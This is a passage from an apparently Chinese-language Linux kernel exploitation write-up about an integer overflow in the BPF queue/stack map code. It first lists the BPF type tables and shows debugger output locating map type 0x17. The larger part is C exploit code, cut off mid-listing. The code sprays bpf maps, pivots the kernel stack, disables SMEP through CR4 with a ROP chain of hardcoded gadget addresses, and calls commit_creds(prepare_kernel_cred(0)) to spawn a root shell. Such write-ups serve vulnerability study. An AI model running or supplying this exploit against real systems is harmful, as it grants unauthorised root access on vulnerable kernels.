class="meta-keyword">endif</span></span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LWT_IN, lwt_in)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LWT_OUT, lwt_out)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LWT_XMIT, lwt_xmit)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LWT_SEG6LOCAL, lwt_seg6local)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SOCK_OPS, sock_ops)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SK_SKB, sk_skb)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SK_MSG, sk_msg)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_FLOW_DISSECTOR, flow_dissector)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BPF_EVENTS</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_KPROBE, kprobe)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_TRACEPOINT, tracepoint)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_PERF_EVENT, perf_event)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_RAW_TRACEPOINT, raw_tracepoint)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE, raw_tracepoint_writable)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_BPF</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_DEVICE, cg_dev)</span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_CGROUP_SYSCTL, cg_sysctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BPF_LIRC_MODE2</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_LIRC_MODE2, lirc_mode2)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_INET</span></span><br><span class="line">BPF_PROG_TYPE(BPF_PROG_TYPE_SK_REUSEPORT, sk_reuseport)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_ARRAY, array_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PERCPU_ARRAY, percpu_array_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PROG_ARRAY, prog_array_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PERF_EVENT_ARRAY, perf_event_array_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUPS</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_CGROUP_ARRAY, cgroup_array_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CGROUP_BPF</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_CGROUP_STORAGE, cgroup_storage_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE, cgroup_storage_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_HASH, htab_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_PERCPU_HASH, htab_percpu_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_LRU_HASH, htab_lru_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_LRU_PERCPU_HASH, htab_lru_percpu_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_LPM_TRIE, trie_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PERF_EVENTS</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_STACK_TRACE, stack_trace_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_ARRAY_OF_MAPS, array_of_maps_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_HASH_OF_MAPS, htab_of_maps_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_DEVMAP, dev_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_SK_STORAGE, sk_storage_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_BPF_STREAM_PARSER)</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_SOCKMAP, sock_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_SOCKHASH, sock_hash_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_CPUMAP, cpu_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_XDP_SOCKETS)</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_XSKMAP, xsk_map_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_INET</span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_REUSEPORT_SOCKARRAY, reuseport_array_ops)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_QUEUE, queue_map_ops)</span><br><span class="line">BPF_MAP_TYPE(BPF_MAP_TYPE_STACK, stack_map_ops)  <span class="comment">//**</span></span><br></pre></td></tr></table></figure><p>type的值就应该是 <code>BPF_MAP_TYPE(BPF_MAP_TYPE_STACK, stack_map_ops)</code></p><p>这个值会在 <code>map_update_elem</code>被用到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#125; else if (map-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">   map-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;</span><br><span class="line">err = map-&gt;ops-&gt;map_push_elem(map, value, attr-&gt;flags);</span><br></pre></td></tr></table></figure><p>所以我们要获取type的值，这时候我们可以在 find_and_alloc_map 断下来，然后调试出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   0xffffffff8119d15d    mov    eax, dword ptr [rbx]</span><br><span class="line">   0xffffffff8119d15f    mov    ebp, 0xffffffea</span><br><span class="line"> ► 0xffffffff8119d164    cmp    eax, 0x17</span><br><span class="line"> static struct bpf_map *find_and_alloc_map(union bpf_attr *attr)</span><br><span class="line">&#123;</span><br><span class="line">const struct bpf_map_ops *ops;</span><br><span class="line">u32 type = attr-&gt;map_type;</span><br><span class="line">struct bpf_map *map;</span><br><span class="line">int err;</span><br><span class="line"></span><br><span class="line">if (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line">return ERR_PTR(-EINVAL);</span><br><span class="line">***************</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出 bpf_map_types 最大的idx是 0x17，而要执行queue_stack_map_alloc 就得type就得是最后一个</p><p><code>BPF_MAP_TYPE(BPF_MAP_TYPE_STACK, stack_map_ops)</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o exp exp.c -static -fno-pie</span></span><br><span class="line"><span class="comment">// This is a SMEP bypass exploit against a integer overflow vulnerability </span></span><br><span class="line"><span class="comment">// in Linux kernel bpf module</span></span><br><span class="line"><span class="comment">// The offset used in this exploit is against a custom compiled kernel.</span></span><br><span class="line"><span class="comment">// exploit author: Wei Wu (ww9210@gmail.com)</span></span><br><span class="line"><span class="comment">// modified by : s0xzordIn</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NUMBER 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> native_write_cr4 0xffffffff810037d5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POPRDX 0xffffffff81002dda</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xFFFFFFFF810E3D40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS  0xFFFFFFFF810E3AB0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> poprdiret 0xffffffff810013b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> popraxret 0xffffffff81029c71</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs 0xffffffff81c00d5a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> iretq 0xffffffff8106d8f4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack_pivot_gadget 0xffffffff81954dc8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack_top_offset 0x674</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> krop_base_to_map 0x81954000</span></span><br><span class="line"><span class="keyword">int</span> rop_start=<span class="number">0x1444</span><span class="number">-8</span>;</span><br><span class="line"><span class="keyword">void</span>* krop_base_mapped;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">        <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">        <span class="string">"pushfq\n"</span></span><br><span class="line">        <span class="string">"popq %2\n"</span></span><br><span class="line">        : <span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_rflags)</span><br><span class="line">        :</span><br><span class="line">        : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    <span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    <span class="keyword">char</span> *args[] = &#123;shell, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line">    popraxret,</span><br><span class="line">    <span class="number">0x6f0</span>,</span><br><span class="line">    <span class="number">0xffffffff81001c51</span>,<span class="comment">//native_write_cr4,</span></span><br><span class="line">    poprdiret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    PREPARE_KERNEL_CRED,</span><br><span class="line">    <span class="number">0xffffffff81001c50</span>, <span class="comment">//: pop rsi ; ret</span></span><br><span class="line">    poprdiret,</span><br><span class="line">    <span class="number">0xffffffff81264e0b</span>,<span class="comment">//: push rax; push rsi; ret; </span></span><br><span class="line">    COMMIT_CREDS,</span><br><span class="line">    swapgs,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    iretq,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;get_shell,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">//user_cs,</span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//user_rflags,</span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//krop_base_mapped + 0x4000,</span></span><br><span class="line">    <span class="number">0</span><span class="comment">//user_ss</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * fakestack;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_krop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    krop_base_mapped=mmap((<span class="keyword">void</span> *)krop_base_to_map,<span class="number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (krop_base_mapped&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">"mmap failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fakestack=mmap((<span class="keyword">void</span> *)<span class="number">0xa000000000</span>,<span class="number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="number">0x0000000081954dc8</span>=popraxret;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)krop_base_to_map = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x1000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x2000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x3000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x4000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x4000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x3000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x2000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x1000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x10</span>) = stack_pivot_gadget;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    rop_chain[<span class="number">12</span>+<span class="number">2</span>]=user_cs;</span><br><span class="line">    rop_chain[<span class="number">13</span>+<span class="number">2</span>]=user_rflags;</span><br><span class="line">    rop_chain[<span class="number">14</span>+<span class="number">2</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(fakestack + <span class="number">0x6000</span>);</span><br><span class="line">    rop_chain[<span class="number">15</span>+<span class="number">2</span>]=user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(krop_base_mapped+rop_start,rop_chain,<span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"rop_payload_initialized"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_bpf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> r[<span class="number">1</span>] = &#123;<span class="number">0xffffffffffffffff</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defragmentation</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">defragment</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">200</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(name, <span class="number">100</span>, <span class="string">"xxx%d"</span>, i);</span><br><span class="line">        fp=fopen(name,<span class="string">"w"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> victim[SPRAY_NUMBER];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;SPRAY_NUMBER;i++)&#123;</span><br><span class="line">        victim[i] = syscall(__NR_bpf, <span class="number">0</span>, <span class="number">0x200011c0</span>, <span class="number">0x2c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//signal(SIGSEGV,get_shell);</span></span><br><span class="line">  syscall(__NR_mmap, <span class="number">0x20000000</span>, <span class="number">0x1000000</span>, <span class="number">3</span>, <span class="number">0x32</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">long</span> res = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c0</span> = <span class="number">0x17</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c4</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011c8</span> = <span class="number">0x40</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011cc</span> = <span class="number">-1</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d0</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d4</span> = <span class="number">-1</span>;</span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200011d8</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011dc</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011dd</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011de</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011df</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e0</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e1</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e2</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e3</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e4</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e5</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span 